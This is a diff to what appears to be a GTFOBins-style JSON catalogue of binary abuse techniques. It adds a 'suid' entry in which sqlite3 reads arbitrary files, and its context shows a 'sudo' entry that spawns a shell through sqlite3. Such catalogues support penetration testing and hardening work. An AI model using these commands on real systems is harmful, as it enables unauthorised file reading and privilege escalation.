@@ -15,6 +15,11 @@
         "code": "sqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import [file] t\nSELECT * FROM t;\nEOF\n"
       }
     ],
+    "suid": [
+      {
+        "code": "sqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import [file] t\nSELECT * FROM t;\nEOF"
+      }
+    ],
     "sudo": [
       {
         "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
